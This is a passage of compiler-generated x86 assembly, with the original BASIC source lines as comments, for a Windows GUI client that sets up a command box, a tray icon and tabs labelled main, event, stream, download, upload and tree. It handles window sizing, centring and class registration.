	push	150			;;; i656a
	call	func1F.client			;;; i619
	mov	d[ebp-56],eax			;;; i670
	push	200			;;; i656a
	push	208			;;; i656a
	push	212			;;; i656a
	call	func1F.client			;;; i619
	mov	d[ebp-96],eax			;;; i670
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp-96]			;;; i674a
	push	[ebp-56]			;;; i674a
	call	func15.client			;;; i619
	jmp	end.func5.client			;;; i258
;
; [1697] 'END SELECT
;
; [1699] CASE $$WM_SIZE :
	jmp	end.select.00AC.client			;;; i69
case.00AC.0007.client:
	mov	eax,5			;;; i659
	mov	ebx,d[ebp-48]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00AC.0008.client			;;; i71
;
; [1700] fSizeType = wParam
#ifdef WndProc.fSizeType
#undef WndProc.fSizeType
#endif
#define WndProc.fSizeType ebp-172	; exposes local variable 'fSizeType'
;
	mov	eax,d[ebp+16]			;;; i665
	mov	d[ebp-172],eax			;;; i670
;
; [1701] width = LOWORD(lParam)
#ifdef WndProc.width
#undef WndProc.width
#endif
#define WndProc.width ebp-176	; exposes local variable 'width'
;
	push	[ebp+20]			;;; i674a
	call	func1E.client			;;; i619
	mov	d[ebp-176],eax			;;; i670
;
; [1702] height = HIWORD(lParam)
#ifdef WndProc.height
#undef WndProc.height
#endif
#define WndProc.height ebp-180	; exposes local variable 'height'
;
	push	[ebp+20]			;;; i674a
	call	func1D.client			;;; i619
	mov	d[ebp-180],eax			;;; i670
;
; [1703] SetWindowPos (#CmdLine,0, 1, 1, width-1, 18,0)
;
; [0] EXTERNAL FUNCTION SetWindowPos (hwnd, hWndInsertAfter, x, y, cx, cy, wFlags)
	mov	eax,d[ebp-176]			;;; i665
	sub	eax,1			;;; i791
	mov	d[ebp-56],eax			;;; i670
	push	0			;;; i656a
	push	18			;;; i656a
	push	[ebp-56]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	0			;;; i656a
	push	[%#CmdLine.client]			;;; i672a
	call	_SetWindowPos@28			;;; i619
;
; [1704] SetWindowPos (#hTabCtl,0, 0, 19, width,height-19, 0)
data section 'globals$shared'
align	4
%#hTabCtl.client:	db 4 dup ?
.code
	mov	eax,d[ebp-180]			;;; i665
	sub	eax,19			;;; i791
	mov	d[ebp-56],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	push	[ebp-176]			;;; i674a
	push	19			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[%#hTabCtl.client]			;;; i672a
	call	_SetWindowPos@28			;;; i619
;
; [1705] FOR w = 0 TO UBOUND(TabChildCon[])
#ifdef WndProc.w
#undef WndProc.w
#endif
#define WndProc.w ebp-184	; exposes local variable 'w'
;
	mov	eax,0			;;; i659
	mov	d[ebp-184],eax			;;; i670
	mov	eax,d[%%%TabChildCon.client]			;;; i663a
	test	eax,eax			;;; i593
	jz	> A.315			;;; i594
	mov	eax,d[eax-8]			;;; i595
A.315:
	dec	eax			;;; i596
; .forlimit5.00BE = ebp-188	; internal variable
	mov	d[ebp-188],eax			;;; i670
align 8
for.00BE.client:
	mov	eax,d[ebp-184]			;;; i665
	mov	ebx,d[ebp-188]			;;; i665
	cmp	eax,ebx			;;; i153
	jg	>> end.for.00BE.client			;;; i154
;
; [1706] SetWindowPos (GetTabChild(w),0, 0, 26, width-2,height-47, 0)
	push	[ebp-184]			;;; i674a
	call	func29.client			;;; i619
	mov	d[ebp-56],eax			;;; i670
	mov	eax,d[ebp-176]			;;; i665
	sub	eax,2			;;; i791
	mov	d[ebp-96],eax			;;; i670
	mov	eax,d[ebp-180]			;;; i665
	sub	eax,47			;;; i791
	mov	d[ebp-104],eax			;;; i670
	push	0			;;; i656a
	push	[ebp-104]			;;; i674a
	push	[ebp-96]			;;; i674a
	push	26			;;; i656a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-56]			;;; i674a
	call	_SetWindowPos@28			;;; i619
;
; [1707] NEXT w
do.next.00BE.client:
	inc	d[ebp-184]			;;; i229
	jmp	for.00BE.client			;;; i231
end.for.00BE.client:
;
; [1709] SELECT CASE fSizeType
	mov	eax,d[ebp-172]			;;; i665
; .select5.00BF = ebp-192	; internal variable
	mov	d[ebp-192],eax			;;; i670
;
; [1710] CASE $$SIZE_MINIMIZED :
	mov	eax,1			;;; i659
	mov	ebx,d[ebp-192]			;;; i665
	cmp	eax,ebx			;;; i684a
	jne	>> case.00BF.0001.client			;;; i71
;
; [1711] ShowWindow (hWnd, $$SW_HIDE)
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_ShowWindow@8			;;; i619
;
; [1712] CASE $$SIZE_RESTORED, $$SIZE_MAXIMIZED  :
	jmp	end.select.00BF.client			;;; i69
case.00BF.0001.client:
	mov	eax,0			;;; i659
	mov	ebx,d[ebp-192]			;;; i665
	cmp	eax,ebx			;;; i684a
	je	>> caser.00BF.0001.client			;;; i70
	mov	eax,2			;;; i659
	cmp	eax,ebx			;;; i684a
	jne	>> case.00BF.0002.client			;;; i71
caser.00BF.0001.client:
;
; [1713] 'GetClientRect (hWnd, &rc)
;
; [1714] 'MoveWindow (#hStatic1, 0, 0, rc.right, rc.bottom, $$TRUE)
;
; [1715] END SELECT
case.00BF.0002.client:
end.select.00BF.client:
;
; [1717] CASE ELSE	: RETURN DefWindowProcA (hWnd, msg, wParam, lParam)
	jmp	end.select.00AC.client			;;; i69
case.00AC.0008.client:
;
; [0] EXTERNAL FUNCTION DefWindowProcA (hwnd, wMsg, wParam, lParam)
	push	[ebp+20]			;;; i674a
	push	[ebp+16]			;;; i674a
	push	[ebp+12]			;;; i674a
	push	[ebp+8]			;;; i674a
	call	_DefWindowProcA@16			;;; i619
	jmp	end.func5.client			;;; i258
;
; [1718] END SELECT
end.select.00AC.client:
;
; [1720] RETURN 0
	mov	eax,0			;;; i659
	jmp	end.func5.client			;;; i258
;
; [1721] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.WndProc.client:  ;;; Function end label for Assembly Programmers.
end.func5.client:
  mov ebx,[ebp-36]
  fs mov [0],ebx       ;;; remove unwind handler
  call free.func5.client
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	16			;;; i111a
free.func5.client:
	mov	esi,[ebp-40]			;;; i665
	call	%____free			;;; i423
	mov	esi,[ebp-44]			;;; i665
	call	%____free			;;; i423
  ret
;-peep
;  *****
;  *****  END FUNCTION  WndProc ()  *****
;  *****
;
; [1723] FUNCTION  CenterWindow (hWnd)
.code
;
#ifdef CenterWindow.hWnd
#undef CenterWindow.hWnd
#endif
#define CenterWindow.hWnd ebp+8	; exposes function argument 'hWnd'
;
align 16
_CenterWindow.client@4:
;  *****
;  *****  FUNCTION  CenterWindow ()  *****
;  *****
func6.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,188			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody6.client:
;
; [1724] TRECT wRect
; .composites = ebp-40	; internal variable
#ifdef CenterWindow.wRect
#undef CenterWindow.wRect
#endif
#define CenterWindow.wRect ebp-44	; exposes local variable 'wRect'
;
;
; [1727] GetWindowRect (hWnd, &wRect)
;
; [0] EXTERNAL FUNCTION GetWindowRect (hwnd, lpRect)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	push	[ebp+8]			;;; i674a
	call	_GetWindowRect@8			;;; i619
;
; [1728] #screenWidth  = GetSystemMetrics ($$SM_CXSCREEN)
data section 'globals$shared'
align	4
%#screenWidth.client:	db 4 dup ?
.code
;
; [0] EXTERNAL FUNCTION GetSystemMetrics (nIndex)
	push	0			;;; i656a
	call	_GetSystemMetrics@4			;;; i619
	mov	d[%#screenWidth.client],eax			;;; i668
;
; [1729] #screenHeight = GetSystemMetrics ($$SM_CYSCREEN)
data section 'globals$shared'
align	4
%#screenHeight.client:	db 4 dup ?
.code
	push	1			;;; i656a
	call	_GetSystemMetrics@4			;;; i619
	mov	d[%#screenHeight.client],eax			;;; i668
;
; [1730] x = (#screenWidth - (wRect.right - wRect.left))/2
#ifdef CenterWindow.x
#undef CenterWindow.x
#endif
#define CenterWindow.x ebp-48	; exposes local variable 'x'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+8]			;;; i313b
	mov	ebx,d[ebp-44]			;;; i665
	mov	ebx,d[ebx]			;;; i313b
	sub	eax,ebx			;;; i791
	mov	ebx,d[%#screenWidth.client]			;;; i663a
	xchg	eax,ebx			;;; i790
	sub	eax,ebx			;;; i791
	mov	esi,2
	cdq	
	idiv	esi
	mov	d[ebp-48],eax			;;; i670
;
; [1731] y = (#screenHeight - (wRect.bottom - wRect.top))/2
#ifdef CenterWindow.y
#undef CenterWindow.y
#endif
#define CenterWindow.y ebp-52	; exposes local variable 'y'
;
	mov	eax,d[ebp-44]			;;; i665
	mov	eax,d[eax+12]			;;; i313b
	mov	ebx,d[ebp-44]			;;; i665
	mov	ebx,d[ebx+4]			;;; i313b
	sub	eax,ebx			;;; i791
	mov	ebx,d[%#screenHeight.client]			;;; i663a
	xchg	eax,ebx			;;; i790
	sub	eax,ebx			;;; i791
	mov	esi,2
	cdq	
	idiv	esi
	mov	d[ebp-52],eax			;;; i670
;
; [1732] RETURN SetWindowPos (hWnd, 0, x, y, 0, 0, $$SWP_NOSIZE OR $$SWP_NOZORDER)
	mov	eax,1			;;; i659
	or	eax,4			;;; i763
	push	eax			;;; i667a
	push	0			;;; i656a
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	0			;;; i656a
	push	[ebp+8]			;;; i674a
	call	_SetWindowPos@28			;;; i619
	jmp	end.func6.client			;;; i258
;
; [1733] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.CenterWindow.client:  ;;; Function end label for Assembly Programmers.
end.func6.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	4			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  CenterWindow ()  *****
;  *****
;
; [1735] FUNCTION  InitGui ()
.code
align 16
_InitGui.client@0:
;  *****
;  *****  FUNCTION  InitGui ()  *****
;  *****
func7.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
	sub	esp,220			;;; i114a
;
funcBody7.client:
;
; [1736] SHARED hInst
;
; [1738] hInst = GetModuleHandleA (0)
;
; [0] EXTERNAL FUNCTION GetModuleHandleA (lpModuleName)
	push	0			;;; i656a
	call	_GetModuleHandleA@4			;;; i619
	mov	d[%hInst.client],eax			;;; i668
;
; [1739] IFZ hInst THEN QUIT(0)
	mov	eax,d[%hInst.client]			;;; i663a
	test	eax,eax			;;; i194
	jnz	>> else.00C0.client			;;; i195
	sub	esp,64			;;; i487
	mov	d[esp],0
	call	%_quit
	add	esp,64			;;; i600
else.00C0.client:
end.if.00C0.client:
;
; [1740] InitCommonControls()
;
; [0] EXTERNAL FUNCTION  InitCommonControls ()
	call	_InitCommonControls@0			;;; i619
;
; [1741] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.InitGui.client:  ;;; Function end label for Assembly Programmers.
end.func7.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret						;;; i111d
;-peep
;  *****
;  *****  END FUNCTION  InitGui ()  *****
;  *****
;
; [1743] FUNCTION  RegisterWinClass (className$, titleBar$)
.code
;
#ifdef RegisterWinClass.className$
#undef RegisterWinClass.className$
#endif
#define RegisterWinClass.className$ ebp+8	; exposes function argument 'className$'
;
;
#ifdef RegisterWinClass.titleBar$
#undef RegisterWinClass.titleBar$
#endif
#define RegisterWinClass.titleBar$ ebp+12	; exposes function argument 'titleBar$'
;
align 16
_RegisterWinClass.client@8:
;  *****
;  *****  FUNCTION  RegisterWinClass ()  *****
;  *****
func8.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  sub esp,16      ;;; reserved for unwind handler
;
;	#### Begin Local Initialization Code ####
	xor	eax,eax		;;; .
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
	push	eax			;;; ..
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,196			;;; i114a
;
;	#### Begin Composite Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.329:
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.329			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Composite Initialization Code ####
;
	lea	eax,[esp]			;;; i125
	mov	d[ebp-44],eax			;;; i670
funcBody8.client:
;
; [1744] SHARED hInst
;
; [1745] WNDCLASS wc
; .composites = ebp-40	; internal variable
#ifdef RegisterWinClass.wc
#undef RegisterWinClass.wc
#endif
#define RegisterWinClass.wc ebp-44	; exposes local variable 'wc'
;
;
; [1748] wc.style           = $$CS_HREDRAW OR $$CS_VREDRAW OR $$CS_OWNDC
	mov	eax,2			;;; i659
	or	eax,1			;;; i763
	or	eax,32			;;; i763
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx],eax			;;; i13b
;
; [1749] wc.lpfnWndProc     = &WndProc()
	mov	eax,addr _WndProc.client@16			;;; i599
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+4],eax			;;; i13b
;
; [1750] wc.cbClsExtra      = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+8],ebx			;;; i13b
;
; [1751] wc.cbWndExtra      = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+12],ebx			;;; i13b
;
; [1752] wc.hInstance       = hInst
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,d[%hInst.client]			;;; i663a
	mov	d[eax+16],ebx			;;; i13b
;
; [1753] wc.hIcon           = LoadIconA (hInst, &"xscience")
;
; [0] EXTERNAL FUNCTION LoadIconA (hInstance, lpIconName)
	mov	eax,addr @_string.03D1.client			;;; i642
	push	eax			;;; i667a
	push	[%hInst.client]			;;; i672a
	call	_LoadIconA@8			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+20],eax			;;; i13b
;
; [1754] wc.hCursor         = LoadCursorA (0, $$IDC_ARROW)
;
; [0] EXTERNAL FUNCTION LoadCursorA (hInstance, lpCursorName)
	push	32512			;;; i656a
	push	0			;;; i656a
	call	_LoadCursorA@8			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+24],eax			;;; i13b
;
; [1755] wc.hbrBackground   = GetStockObject ($$LTGRAY_BRUSH)
;
; [0] EXTERNAL FUNCTION  GetStockObject             (object)
	push	1			;;; i656a
	call	_GetStockObject@4			;;; i619
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+28],eax			;;; i13b
;
; [1756] wc.lpszMenuName    = 0
	mov	eax,d[ebp-44]			;;; i665
	mov	ebx,0			;;; i659
	mov	d[eax+32],ebx			;;; i13b
;
; [1757] wc.lpszClassName   = &className$
	mov	eax,d[ebp+8]			;;; i642
	mov	ebx,d[ebp-44]			;;; i665
	mov	d[ebx+36],eax			;;; i13b
;
; [1759] RETURN RegisterClassA (&wc)
;
; [0] EXTERNAL FUNCTION RegisterClassA (lpWndClass)
	mov	eax,d[ebp-44]			;;; i642
	push	eax			;;; i667a
	call	_RegisterClassA@4			;;; i619
	jmp	end.func8.client			;;; i258
;
; [1760] END FUNCTION
	xor	eax,eax			;;; i862
align 8
end.RegisterWinClass.client:  ;;; Function end label for Assembly Programmers.
end.func8.client:
	lea	esp,[ebp-20]				;;; i110
	pop	ebx				;;; restore ebx
	pop	edi				;;; restore edi
	pop	esi				;;; restore esi
	leave					;;; replaces 'mov esp,ebp' 'pop ebp'
	ret	8			;;; i111a
;-peep
;  *****
;  *****  END FUNCTION  RegisterWinClass ()  *****
;  *****
;
; [1762] FUNCTION  CreateWindows ()
.code
align 16
_CreateWindows.client@0:
;  *****
;  *****  FUNCTION  CreateWindows ()  *****
;  *****
func9.client:
	push	ebp			;;; i112
	mov	ebp,esp		;;; i113
	sub	esp,8			;;; i114
	push	esi			;;; save esi
	push	edi			;;; save edi
	push	ebx			;;; save ebx
  push addr free.func9.client
  push ebp
  push addr _XxxUnwinder
  fs push [0]
  fs mov [0],esp  ;;; install unwind handler
;
;	#### Begin Local Initialization Code ####
	mov	ecx,2				;;; ..
	xor	eax,eax			;;; ...
A.332:
	push	eax, eax, eax, eax
	push	eax, eax, eax, eax
	dec	ecx					;;; ....
	jnz	< A.332			;;; .....
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
	push	eax				;;; ......
;	#### End Local Initialization Code ####
;
;	################################################################################
;	### *** IMPORTANT *** - If hand-optimizing by eliminating the initialization ###
;	### code above, the first 'sub esp,____' line below must be uncommented      ###
;	### and the second must be either deleted or commented out.                  ###
;	### !!! Failure to do so will cause the resultant program to crash !!!       ###
;	################################################################################
;
;	sub esp,220
	sub	esp,128			;;; i114a
;
funcBody9.client:
;
; [1763] SHARED className$
data section 'globals$shared'
align	4
%className$.client:	db 4 dup ?
.code
;
; [1764] SHARED hInst
;
; [1767] className$ = "cmdwnd"
	mov	eax,addr @_string.03DA.client			;;; i663
	call	%_clone.a0			;;; i3a
	mov	ebx,addr %className$.client			;;; i4
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1768] titleBar$ = "cmd"
#ifdef CreateWindows.titleBar$
#undef CreateWindows.titleBar$
#endif
#define CreateWindows.titleBar$ ebp-40	; exposes local variable 'titleBar$'
;
	mov	eax,addr @_string.03DC.client			;;; i663
	call	%_clone.a0			;;; i3a
	lea	ebx,[ebp-40]			;;; i5
	mov	esi,d[ebx]			;;; i6a
	mov	d[ebx],eax			;;; i6b
	call	%____free			;;; i6c
;
; [1769] style = $$WS_OVERLAPPEDWINDOW
#ifdef CreateWindows.style
#undef CreateWindows.style
#endif
#define CreateWindows.style ebp-44	; exposes local variable 'style'
;
	mov	eax,13565952			;;; i657
	mov	d[ebp-44],eax			;;; i670
;
; [1770] w = 560: h = 350
#ifdef CreateWindows.w
#undef CreateWindows.w
#endif
#define CreateWindows.w ebp-48	; exposes local variable 'w'
;
	mov	eax,560			;;; i659
	mov	d[ebp-48],eax			;;; i670
#ifdef CreateWindows.h
#undef CreateWindows.h
#endif
#define CreateWindows.h ebp-52	; exposes local variable 'h'
;
	mov	eax,350			;;; i659
	mov	d[ebp-52],eax			;;; i670
;
; [1771] #winMain = NewWindow (className$, titleBar$, style, x, y, w, h, 0)
	mov	eax,d[%className$.client]			;;; i663a
	call	%_clone.a0			;;; i634
; .xstk9.0000 = ebp-60	; internal variable
	mov	d[ebp-60],eax			;;; i670
	mov	eax,d[ebp-40]			;;; i665
	call	%_clone.a0			;;; i634
; .xstk9.0001 = ebp-68	; internal variable
	mov	d[ebp-68],eax			;;; i670
#ifdef CreateWindows.x
#undef CreateWindows.x
#endif
#define CreateWindows.x ebp-72	; exposes local variable 'x'
;
#ifdef CreateWindows.y
#undef CreateWindows.y
#endif
#define CreateWindows.y ebp-76	; exposes local variable 'y'
;
	push	0			;;; i656a
	push	[ebp-52]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	[ebp-76]			;;; i674a
	push	[ebp-72]			;;; i674a
	push	[ebp-44]			;;; i674a
	push	[ebp-68]			;;; i674a
	push	[ebp-60]			;;; i674a
	call	funcA.client			;;; i619
	sub	esp,32			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,32			;;; i633
	mov	d[%#winMain.client],eax			;;; i668
;
; [1773] #WM_TaskbarRestart = RegisterWindowMessageA(&"TaskbarCreated")' listen for explorer restarts messages
;
; [0] EXTERNAL FUNCTION RegisterWindowMessageA (lpString)
	mov	eax,addr @_string.03E7.client			;;; i642
	push	eax			;;; i667a
	call	_RegisterWindowMessageA@4			;;; i619
	mov	d[%#WM_TaskbarRestart.client],eax			;;; i668
;
; [1774] InstallTrayIcon (#winMain)
	push	[%#winMain.client]			;;; i672a
	call	func19.client			;;; i619
;
; [1777] #CmdLine = NewChild ("edit","", $$ES_AUTOHSCROLL, 1, h-45, 550, 18, #winMain, $$CmdLine, $$WS_EX_STATICEDGE)
	mov	eax,addr @_string.03E9.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i665
	sub	eax,45			;;; i791
	mov	d[ebp-68],eax			;;; i670
	push	131072			;;; i656a
	push	401			;;; i656a
	push	[%#winMain.client]			;;; i672a
	push	18			;;; i656a
	push	550			;;; i656a
	push	[ebp-68]			;;; i674a
	push	1			;;; i656a
	push	128			;;; i656a
	push	0			;;; i665a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#CmdLine.client],eax			;;; i668
;
; [1778] #hTabCtl = NewChild ($$WC_TABCONTROL, "", $$WS_CLIPSIBLINGS | $$TCS_EX_FLATSEPARATORS | $$WS_VISIBLE | $$WS_TABSTOP | $$WS_CHILD, 1, 1, w, h-40, #winMain, $$Tab1, $$WS_EX_STATICEDGE)
	mov	eax,addr @_string.25B4.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,67108864			;;; i657
	or	eax,1			;;; i763
	or	eax,268435456			;;; i763
	or	eax,65536			;;; i763
	or	eax,1073741824			;;; i763
	mov	d[ebp-68],eax			;;; i670
	mov	eax,d[ebp-52]			;;; i665
	sub	eax,40			;;; i791
; .xstk9.0002 = ebp-84	; internal variable
	mov	d[ebp-84],eax			;;; i670
	push	131072			;;; i656a
	push	120			;;; i656a
	push	[%#winMain.client]			;;; i672a
	push	[ebp-84]			;;; i674a
	push	[ebp-48]			;;; i674a
	push	1			;;; i656a
	push	1			;;; i656a
	push	[ebp-68]			;;; i674a
	push	0			;;; i665a
	push	[ebp-60]			;;; i674a
	call	funcB.client			;;; i619
	sub	esp,40			;;; xnt1i
	mov	esi,d[esp]			;;; i871
	call	%____free			;;; i872
	add	esp,40			;;; i633
	mov	d[%#hTabCtl.client],eax			;;; i668
;
; [1780] #main_tab = AddEditTabChild (#hTabCtl,"main",$$main,$$WS_VSCROLL)
	mov	eax,addr @_string.03F7.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	2097152			;;; i656a
	push	200			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[%#hTabCtl.client]			;;; i672a
	call	func2A.client			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
	mov	d[%#main_tab.client],eax			;;; i668
;
; [1781] #event_tab = AddRichEditTabChild (#hTabCtl,"event",$$event,$$WS_VSCROLL)
	mov	eax,addr @_string.03FA.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	2097152			;;; i656a
	push	201			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[%#hTabCtl.client]			;;; i672a
	call	func66.client			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
	mov	d[%#event_tab.client],eax			;;; i668
;
; [1782] SendMessageA (#event_tab, $$EM_SETBKGNDCOLOR, 0, RGB(212, 208, 200))
	push	200			;;; i656a
	push	208			;;; i656a
	push	212			;;; i656a
	call	func1F.client			;;; i619
	push	eax			;;; i667a
	push	0			;;; i656a
	push	1091			;;; i656a
	push	[%#event_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1783] SendMessageA (#event_tab, $$EM_AUTOURLDETECT, 1, 0)
	push	0			;;; i656a
	push	1			;;; i656a
	push	1115			;;; i656a
	push	[%#event_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1784] SendMessageA (#event_tab, $$EM_SETEVENTMASK , 0 , $$ENM_LINK )
	push	67108864			;;; i656a
	push	0			;;; i656a
	push	1093			;;; i656a
	push	[%#event_tab.client]			;;; i672a
	call	_SendMessageA@16			;;; i619
;
; [1787] #stream_tab = AddEditTabChild (#hTabCtl,"stream",$$stream,$$WS_VSCROLL)
	mov	eax,addr @_string.0400.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	2097152			;;; i656a
	push	202			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[%#hTabCtl.client]			;;; i672a
	call	func2A.client			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
	mov	d[%#stream_tab.client],eax			;;; i668
;
; [1788] #download_tab = AddEditTabChild (#hTabCtl,"download",$$download,$$WS_EX_CONTROLPARENT)
data section 'globals$shared'
align	4
%#download_tab.client:	db 4 dup ?
.code
	mov	eax,addr @_string.012C.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	65536			;;; i656a
	push	203			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[%#hTabCtl.client]			;;; i672a
	call	func2A.client			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
	mov	d[%#download_tab.client],eax			;;; i668
;
; [1789] #upload_tab = AddEditTabChild (#hTabCtl,"upload",$$upload,$$WS_EX_CONTROLPARENT)
data section 'globals$shared'
align	4
%#upload_tab.client:	db 4 dup ?
.code
	mov	eax,addr @_string.0129.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	push	65536			;;; i656a
	push	204			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[%#hTabCtl.client]			;;; i672a
	call	func2A.client			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
	mov	d[%#upload_tab.client],eax			;;; i668
;
; [1790] #tree_tab = AddTreeTabChild (#hTabCtl,"tree",$$tree, $$TVS_HASBUTTONS | $$TVS_HASLINES | $$TVS_HASBUTTONS | $$TVS_LINESATROOT)
	mov	eax,addr @_string.0128.client			;;; i663
	call	%_clone.a0			;;; i634
	mov	d[ebp-60],eax			;;; i670
	mov	eax,1			;;; i659
	or	eax,2			;;; i763
	or	eax,1			;;; i763
	or	eax,4			;;; i763
	push	eax			;;; i667a
	push	205			;;; i656a
	push	[ebp-60]			;;; i674a
	push	[%#hTabCtl.client]			;;; i672a
	call	func2B.client			;;; i619
	sub	esp,16			;;; xnt1i
	mov	esi,d[esp+4]			;;; i871
	call	%____free			;;; i872
	add	esp,16			;;; i633
	mov	d[%#tree_tab.client],eax			;;; i668
;
; [1793] '	left = 300: top = 80: hwnd = #upload_tab
;
; [1794] '	#group1 = NewChild ("button", "active mode", $$BS_GROUPBOX, left, top, 136, 38, hwnd, 1234, 0)
;
; [1795] '	#radio1 = NewChild ("button", "server", $$BS_AUTORADIOBUTTON | $$WS_GROUP , left+5, top+18, 64, 15,hwnd, 1234, 0)
;
; [1796] '	#radio2 = NewChild ("button", "client", $$BS_AUTORADIOBUTTON, left+74, top+18, 60, 15, hwnd, 1234, 0)
;
; [1797] '	SendMessageA (#radio1, $$BM_SETCHECK, $$BST_CHECKED, 0)
;
